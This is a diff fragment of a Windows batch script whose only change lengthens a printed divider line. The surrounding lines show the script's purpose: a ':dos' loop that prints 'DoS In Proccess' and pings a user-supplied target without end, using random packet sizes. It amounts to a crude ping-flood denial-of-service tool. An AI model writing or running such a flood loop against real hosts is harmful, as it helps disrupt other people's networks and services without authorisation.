@@ -9,7 +9,7 @@ set /p web=
 :dos
 cls
 echo [[DoS In Proccess]]
-echo ----------------
+echo -------------------
 set /a rng=(%random%/15)
 ping %web% -l %rng%
 goto dos
